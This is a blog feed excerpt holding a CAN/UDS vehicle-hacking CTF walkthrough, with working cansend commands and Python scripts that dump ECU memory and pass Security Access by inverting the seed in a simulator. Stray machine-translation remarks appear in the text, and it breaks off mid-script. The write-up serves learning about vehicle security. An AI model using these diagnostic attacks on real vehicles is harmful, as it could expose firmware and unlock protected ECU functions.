&#xC2E4;&#xC81C;&#xB85C; CVE&#xAC00; &#xBC1C;&#xAE09;&#xC774; &#xB418;&#xB294; &#xC0AC;&#xB840;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; Nissan Altima&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6347">CVE-2024-6347</a>&#xC785;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-6347&#xB294; UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xC0AC;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xAC01;&#xC9C0;&#xB300; &#xAC10;&#xC9C0; &#xC13C;&#xC11C; ECU &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; ECU &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC138;&#xC158;&#xC73C;&#xB85C; &#xBB34;&#xB2E8; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; CAN/UDS&#xB97C; &#xD1B5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>22</code>)&#xACFC; &#xB2E4;&#xC591;&#xD55C; &#xC9C4;&#xB2E8; &#xC694;&#xCCAD;(<code>19</code> &#xB4F1;)&#xC744; &#xD1B5;&#xD55C; Information Leak, &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;(<code>27</code>) &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; ECU &#xBC0F; &#xCC28;&#xB7C9; &#xB0B4;&#xBD80; &#xAD8C;&#xD55C; &#xD0C8;&#xCDE8; &#xB4F1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, &#xC8FC;&#xC18C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>23</code>)&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD558;&#xBA74;, &#xB0B4;&#xBD80; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC73C;&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xC720;&#xCD9C; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC5C4;&#xBC00;&#xD55C; &#xAC80;&#xC99D;&#xACFC; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;&#xC758; &#xC811;&#xADFC; &#xC81C;&#xC5B4;&#xAC00; &#xCC28;&#xB7C9; &#xBCF4;&#xC548;&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC694;&#xC18C;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CAN/">CAN</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/UDS/">UDS</category>
      
      <category domain="https://hackyboiz.github.io/tags/VSEC/">VSEC</category>
      
      <category domain="https://hackyboiz.github.io/tags/automotive/">automotive</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockharbor/">blockharbor</category>
      
      <category domain="https://hackyboiz.github.io/tags/car/">car</category>
      
      <category domain="https://hackyboiz.github.io/tags/vehicle/">vehicle</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Understanding CAN / UDS Vulnerabilities through BlockHarbor CTF and CVEs (EN)</title>
      <link>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/</link>
      <guid>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/</guid>
      <pubDate>Thu, 20 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;i</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>In the automotive field, a communication protocol that is frequently used and applied is CAN communication. Security vulnerabilities can also occur in this CAN communication! Many CTFs and competitions are also being held targeting the automotive sector (Defcon also has a Car Hacking Village).</p><p>In this article, we&#x2019;ll solve a problem from the BlockHarbor CTF, one of the most famous CTFs for vehicle hacking, to learn about vehicle communication and the resulting security vulnerabilities!</p><h2 id="1-CAN-Bus-amp-UDS"><a href="#1-CAN-Bus-amp-UDS" class="headerlink" title="1. CAN Bus &amp; UDS"></a>1. CAN Bus &amp; UDS</h2><p><img src="image02.png" alt="[image02.png](https://t-shaped-person.tistory.com/51)"></p><p>CAN (Controller Area Network) communication is a protocol developed for communication between devices within a vehicle, such as ECUs (Electronic Control Units). It uses a message-based, low-level network communication system in a non-host bus manner. Since it was developed in 1983, it predates the HTTP protocol! A basic CAN message consists of 8 Bytes, and the extended version, CAN-FD (Flexible Data-rate), can represent data up to 64 Bytes.</p><p>Furthermore, the international standard for CAN communication is specified by ISO 15765.</p><p><img src="image03.png" alt="[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)"></p><p>UDS stands for Unified Diagnostic Services, and you&#x2019;ll frequently encounter this term when dealing with vehicle CTFs and CAN communication. It is a protocol used for diagnostic communication, primarily employed with ECUs. Since it is a higher-level protocol than the low-level CAN protocol, it allows for various functions such as data Read/Write (R/W).</p><p>The international standard for the UDS message structure operating over CAN communication was designated by ISO 15765.</p><p>Since knowing the UDS message structure is crucial for the BlockHarbor CTF challenge we are about to solve, let&#x2019;s briefly look at it. The UDS message is structured as shown in the picture above. A simple explanation of each part is as follows:</p><ul><li>CAN ID: The ECU that will transmit or receive the message.</li><li>PCI (Protocol Control Information): Primarily used for the length of the UDS message, Flow Control, etc.</li><li>SID (Service Identifier): Identifies the requested service.<ul><li>Sub Function Byte: Detailed options for the SID.</li></ul></li><li>DID (Data Identifier): Identifies the data being accessed.</li></ul><p>Now, I will explain some of the more important items among these.</p><p><img src="image04.png" alt="image04.png"></p><p>The CAN ID values for each ECU are set as hexadecimal values according to ISO 15765-4.</p><ul><li><code>7DF</code> is primarily the identifier used for broadcasting to all ECUs or for internal functions/settings to be delivered to an ECU.</li><li>For transmission, the CAN IDs are designated as <code>7E0</code> for ECU 1, <code>7E1</code> for ECU 2, and so on.</li><li>For reception, the ID is designated as the transmission value <code>+ 0x8</code>.</li></ul><p>The SID (Service Identifier) can simply be described as the identifier that signals what action (service) will be performed. Since the SID values are also standardized, you can directly check the SID value corresponding to a service through the <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">document</a>. The corresponding Response SID (RSID) value is the request SID value <code>+ 0x40</code>. If the RSID, which is the response to the requested SID, is successfully received, it indicates that the communication was successful.</p><p>Additionally, there are commands among the SIDs that include a Sub Function Byte. This is used to designate a more detailed service request when an SID is requested. It is optional and may or may not be used, which can be confirmed by checking the documentation.</p><p>The DID (Data Identifier) is the identifier that refers to the data. Many DID values are also reserved according to the ISO-14229 standard, so you can check the <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">document</a> to find the appropriate DID value. The most representative example of a DID is the VIN (Vehicle Identification Number) value, which is <code>F190</code>. If you request this DID value along with an SID, the service corresponding to the SID will be executed targeting the VIN.</p><p>In the case of SIDs that use the Sub Function Byte, which we just explained, there are instances where a DID may not be necessary.</p><p>When solving the upcoming BlockHarbor CTF problems, it is absolutely essential to keep the <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> documentation pages open and look up the commands as you go!</p><h3 id="1-1-CAN-Utils"><a href="#1-1-CAN-Utils" class="headerlink" title="1.1. CAN Utils"></a>1.1. CAN Utils</h3><p><img src="image05.jpg" alt="image05.jpg"></p><p>To transmit and receive CAN/UDS messages, you can use the can-utils tool. This tool is based on SocketCAN, which implements the CAN protocol on Linux. I&#x2019;ll explain this using the example shown below.</p><pre><code class="hljs bash">candump -a vcan0,7E0:7FF</code></pre><p><code>candump</code> is a tool that allows you to receive CAN/UDS messages. By specifying the desired CAN network interface, you can receive CAN messages from that interface. In the example above , the <code>-a</code> option was added to show the ASCII results along with the CAN message, and masking arguments <code>7E0</code> and <code>7FF</code> were added to receive data only from ECU 1.</p><p>When solving the CTF problems later, this command will be frequently used on one terminal to run and check the responses.</p><pre><code class="hljs bash">cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p><code>cansend</code> is a tool that allows you to transmit CAN/UDS messages. Similarly, it can send a CAN message to the desired CAN network interface. For the upcoming problems, you will need to construct the message by properly configuring the SID and DID according to the UDS format explained earlier and then transmit it.</p><p>Additionally, for cases where the response data is larger than the basic CAN message length of 8 Bytes, a commonly used technique is to send a Flow Control request, such as <code>30000000</code>, along with the message to ensure all data is received.</p><p>By using <code>cansend</code> to transmit a message and then confirming the response data with <code>candump</code>, you can verify the entire CAN/UDS communication process.</p><h2 id="2-Blockharbor-CTF"><a href="#2-Blockharbor-CTF" class="headerlink" title="2. Blockharbor CTF"></a>2. Blockharbor CTF</h2><p><img src="image06.jpg" alt="image06.jpg"></p><p>BlockHarbor CTF is an Automotive Capture the Flag (CTF) competition created by the automotive cybersecurity company, Block Harbor. It is highly recommended for solving vehicle hacking problems because it provides a virtual CAN interface environment and a simulation environment for communication between ECUs, making it convenient for hands-on practice with CAN/UDS commands.</p><p>The site is broadly composed of two parts: the <a href="https://proving-grounds.blockharbor.io/">CTF Problem Site</a>, which is built on the CTFd platform, and the <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a> site, which establishes the vehicle simulation environment. If you are new to CAN/UDS and vehicle systems, it is recommended that you start with the &#x201C;Getting Started&#x201D; problems on the CTF problem site.</p><p><img src="image07.png" alt="image07.png"></p><p>When you connect to <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a>, navigate to Other - Learn - SIMULATIONS. By clicking the terminal icon on the right side of Proving Grounds, you can access the vehicle simulation environment&#x2019;s terminal via the web in various environments. Since we will be solving the UDS Challenge problems, we will connect to the UDS Challenge terminal. If you are solving different problems, you can connect to another simulation terminal and use the environment appropriate for that problem.</p><p><img src="image08.png" alt="image08.png"></p><p>When you connect via the terminal icon, you will access a tmux shell like the one shown above. You can solve the CTF problems you&#x2019;ve identified within this environment.</p><h3 id="2-1-tmux-setting"><a href="#2-1-tmux-setting" class="headerlink" title="2.1 tmux setting"></a>2.1 tmux setting</h3><p>To use the tmux terminal environment, you can configure a better problem-solving setup with a few tmux commands and settings. BlockHarbor itself has created a basic <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux introduction</a> via their landing page. I will explain a few of the frequently used commands from that guide.</p><p><img src="image09.png" alt="image09.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># Terminal splitting</span>Ctrl + b%<span class="hljs-comment"># Terminal moving</span>Ctrl + b&#x2190; &#x2192;<span class="hljs-comment"># Terminal scroll</span>Ctrl + b[<span class="hljs-comment"># End scroll</span>Ctrl + c</code></pre><p>You didn&#x2019;t provide the list of tmux commands, but based on your comment, here is the translation emphasizing the general idea:</p><p>The commands and settings listed above are those that are frequently used in practice. Terminal splitting and navigation are used especially often. For additional settings or commands you may want, you can check the <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux intro</a> or search online.</p><h2 id="3-UDS-Challenge"><a href="#3-UDS-Challenge" class="headerlink" title="3. UDS Challenge"></a>3. UDS Challenge</h2><p><img src="image10.png" alt="image10.png"></p><p>The UDS Challenge problems we will solve are tackled by performing the actions required by the problem using UDS commands and controlling the vehicle environment. The <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> used to solve the problems can be found in the documentation introduced earlier.</p><p>Let&#x2019;s start solving the problems right away!</p><h3 id="3-1-Simulation-VIN"><a href="#3-1-Simulation-VIN" class="headerlink" title="3.1. Simulation VIN"></a>3.1. Simulation VIN</h3><p><img src="image11.png" alt="image11.png"></p><p>This problem requires you to retrieve the VIN (Vehicle Identification Number) using UDS.</p><p>The VIN is the Vehicle Identification Number, which was briefly discussed when explaining the commands earlier! The task is to query this value in the simulation environment.</p><p><img src="image12.png" alt="image12.png"></p><p>The translation is:</p><p>First, by checking the network interfaces in the simulation environment, you can confirm the virtual CAN interface, vcan0. You should target this interface when transmitting and receiving CAN/UDS messages.</p><p><img src="image13.png" alt="image13.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)</span>cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>To monitor the transmission and reception messages for the broadcast and ECU 1, I added masking for three CAN IDs in candump. Afterward, I combined the VIN DID and the Read Data By Identifier (SID) and transmitted the message. Since the response comes from ECU 1, by sending a Flow Control request to that ECU, the full VIN can be confirmed, and the flag can be identified!</p><pre><code class="hljs angelscript">e66fb3f67ac3:~$ candump -a vcan0,<span class="hljs-number">7E0</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7E8</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7</span>DF:<span class="hljs-number">7</span>FF  vcan0  <span class="hljs-number">7</span>DF   [<span class="hljs-number">4</span>]  <span class="hljs-number">03</span> <span class="hljs-number">22</span> F1 <span class="hljs-number">90</span>               <span class="hljs-string">&apos;.&quot;..&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">10</span> <span class="hljs-number">14</span> <span class="hljs-number">62</span> F1 <span class="hljs-number">90</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>C <span class="hljs-number">61</span>   <span class="hljs-string">&apos;..b..fla&apos;</span>  vcan0  <span class="hljs-number">7E0</span>   [<span class="hljs-number">4</span>]  <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <span class="hljs-string">&apos;0...&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">21</span> <span class="hljs-number">67</span> <span class="hljs-number">7</span>B <span class="hljs-number">76</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>E <span class="hljs-number">5</span>F <span class="hljs-number">42</span>   <span class="hljs-string">&apos;!g{     &apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">22</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>D <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span> <span class="hljs-number">7</span>D   <span class="hljs-string">&apos;&quot;      }&apos;</span></code></pre><p>Let&#x2019;s examine the received message in detail.</p><p>Upon making the Read Data By Identifier request (<code>22</code>), we can confirm the correct RSID (<code>62</code>) response. Following this, a large amount of data is returned, and continuous values like <code>21</code> and <code>22</code> are indicated before these data packets. This confirms that the data is continuous (a multi-frame transfer). </p><h3 id="3-2-Startup-Message"><a href="#3-2-Startup-Message" class="headerlink" title="3.2. Startup Message"></a>3.2. Startup Message</h3><p><img src="image14.png" alt="image14.png"></p><p>This problem asks about how to restart an ECU. It also states that the diagnostic information is broadcast using <code>7DF</code>.</p><p><img src="image15.png" alt="image15.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)</span>cansend vcan0 7DF<span class="hljs-comment">#021101</span></code></pre><p>The simple way to Restart the ECU is to send a Reset request (<code>11</code>). For the Reset request used in this problem, we use the Default Session (<code>01</code>) Sub Function Byte. Because of this, no separate DID is used. </p><p>When the ECU Reset request with the Default Session is transmitted, you can confirm the corresponding RSID response (<code>51</code>). Subsequently, you can also obtain the flag information!</p><h3 id="3-3-Engine-Trouble"><a href="#3-3-Engine-Trouble" class="headerlink" title="3.3. Engine Trouble?"></a>3.3. Engine Trouble?</h3><p><img src="image16.png" alt="image16.png"></p><p>This problem requires reading the Diagnostic Trouble Codes (DTCs). You must authenticate the flag by matching the DTC format, which is typically <code>Pxxxx-xx</code>.</p><p><img src="image17.png" alt="image17.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)</span>cansend vcan0 7DF<span class="hljs-comment">#03190208</span></code></pre><p>The problem can be solved by sending a Read DTC Information request (<code>19</code>). The DTC (Diagnostic Trouble Codes) can be viewed using a Status Mask. The detailed DTC Status Byte can be found in the <a href="https://buly.kr/2UjxlRq">AUTOSAR documentation</a>.</p><p>The confirmed DTC is <code>P3E9F-01</code>. Since DTCs are used in OBD2 for vehicle diagnostics, you can refer to the corresponding standard, the <a href="https://piembsystech.com/iso-15031-protocol/">ISO 15031</a> document, to understand how to interpret the DTC code.</p><h3 id="3-4-Secrets-in-Memory"><a href="#3-4-Secrets-in-Memory" class="headerlink" title="3.4. Secrets in Memory?"></a>3.4. Secrets in Memory?</h3><p><img src="image18.png" alt="image18.png"></p><p>This problem requires a Read Memory By Address request. The accessible memory area is stated to start from <code>0xC3F80000</code>.</p><p><img src="image19.png" alt="image19.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)</span>cansend vcan0 7DF<span class="hljs-comment">#072314C3F83000FF &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>Data in memory can be read using a memory read request (<code>23</code>).</p><p>A point to note here is that you must calculate and use the value (<code>14</code>) corresponding to the AddressAndLengthFormatIdentifier (AALFId) before specifying the address. You can understand the explanation of AALFId by referring to <a href="https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;t=104s">this video</a>. Consequently, reading is possible by sending a read request for 255 (<code>FF</code>) bytes using the value <code>14</code>, which requests the use of a 4-byte address and 1-byte length format.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data[:dlc]recvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    p.settimeout(<span class="hljs-number">0.5</span>)    <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xC3F83000</span>, <span class="hljs-number">0xC3F865ff</span>, <span class="hljs-number">0xFF</span>):        req_data = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + addr.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7DF</span>, req_data))        <span class="hljs-keyword">try</span>:            resp_frame = p.recv(<span class="hljs-number">16</span>)            resp_id, resp_data = dissect_can_frame(resp_frame)            <span class="hljs-keyword">if</span> resp_data:                recvdata += resp_data.hex()[<span class="hljs-number">6</span>:]        <span class="hljs-keyword">except</span> socket.timeout:            <span class="hljs-keyword">continue</span>        flow_control_data = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7E0</span>, flow_control_data))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):            <span class="hljs-keyword">try</span>:                resp_frame = p.recv(<span class="hljs-number">16</span>)                _, resp_data = dissect_can_frame(resp_frame)                tempdata = resp_data.hex()[<span class="hljs-number">2</span>:]                <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                    recvdata += tempdata            <span class="hljs-keyword">except</span> socket.timeout:                <span class="hljs-keyword">break</span>    hex_data_string = recvdata    <span class="hljs-keyword">try</span>:        byte_data = bytes.fromhex(hex_data_string)        ascii_string = byte_data.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>)        print(ascii_string)            <span class="hljs-keyword">except</span> ValueError:        print(<span class="hljs-string">&quot;error&quot;</span>)</code></pre><p>Through the code above, data in the <code>0xC3F83000</code> range can be parsed.</p><p>Although the Python <code>can</code> module is typically used for CAN communication, it is unavailable in a simulation environment&#x2026; Therefore, it was written using the <code>socket</code> module as a replacement.</p><p>When representing the CAN format with the Python <code>socket</code> module, the argument <code>=IB3x8s</code> must be provided.</p><p><img src="image20.png" alt="image20.png"></p><p>The flag present in memory can be confirmed by executing the code.</p><h3 id="3-5-Security-Access-Level-3"><a href="#3-5-Security-Access-Level-3" class="headerlink" title="3.5. Security Access Level 3"></a>3.5. Security Access Level 3</h3><p><img src="image21.png" alt="image21.png"></p><p>This challenge requires identifying the cryptographic algorithm for Security Access Level 3 and finding the corresponding key for the seed value 0x1337. As described in the problem, the length of both the seed and the key for Level 3 is 2 bytes.</p><p><img src="image22.png" alt="[image22.png](https://blog.naver.com/suresofttech/223327497814)"></p><p>First, let&#x2019;s look at the Security Access function provided by UDS.</p><p>Security Access is a service that controls access rights to the ECU. It&#x2019;s helpful to think of higher numbers representing higher levels of authority. It is used with SID <code>27</code> after first changing to the Extended Diagnostic Session (<code>10</code> - <code>03</code>).</p><p>A seed value is generated, and a key is created through an internal cryptographic algorithm. Communication is performed in a way that grants access if authentication with the corresponding key value is successful. A key point here is that only when sending the key value, the request must be made using the access level value being accessed plus 1.</p><p><img src="image23.png" alt="image23.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 03(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022703</span><span class="hljs-comment"># 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS</span>cansend vcan0 7E0<span class="hljs-comment">#042704KEYS</span></code></pre><p>Authentication for Level 3 can be performed according to the Security Access authentication sequence.</p><p>First, after changing to the Extended Diagnostic Session (<code>1030</code>), the seed value <code>7E53</code> generated by the Security Access Level 3 request (<code>2703</code>) can be confirmed. Upon transmitting the corresponding key value, Security Access was successful, as confirmed by the Security Access RSID (<code>67</code>).</p><p>The cryptographic algorithm used was a simple one that performs a bitwise inversion of the seed value. Therefore, the flag can be obtained as the result of <code>0x1337 ^ 0xFFFF</code>.</p><pre><code class="hljs python"> <span class="hljs-comment"># security access level 3 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x03\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    seed = msg_data.hex()[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>]    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed}</span>&quot;</span>)        key = <span class="hljs-string">f&quot;<span class="hljs-subst">{~int(seed, <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>:<span class="hljs-number">04</span>X}</span>&quot;</span>    print(<span class="hljs-string">f&quot;Keys: <span class="hljs-subst">{key}</span>&quot;</span>)        key_bytes = int(key, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x04\x27\x04&quot;</span> + key_bytes + <span class="hljs-string">b&quot;\x00\x00\x00&quot;</span>    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>        print(<span class="hljs-string">&quot;Security access level 3 unlock!&quot;</span>)</code></pre><p><img src="image24.png" alt="image24.png"></p><p>Additionally, the calculated key value must be transmitted within a very short time after confirming the seed value. Therefore, it is recommended to write code like the one above (though you can do it manually if you are fast enough).</p><h3 id="3-6-Security-Access-Level-1"><a href="#3-6-Security-Access-Level-1" class="headerlink" title="3.6. Security Access Level 1"></a>3.6. Security Access Level 1</h3><p><img src="image25.png" alt="image25.png"></p><p>This challenge requires identifying the Security Access Level 1 cryptographic algorithm by reading the memory in the <code>0x1A000</code> range. The flag is the key value for the seed <code>0x7D0E1A5C</code>. It is known that the seed and key lengths for Level 1 are 4 bytes.</p><p>Oddly, in this UDS Challenge, Level 1 is placed after Level 3.</p><pre><code class="hljs python"><span class="hljs-comment"># read memory</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    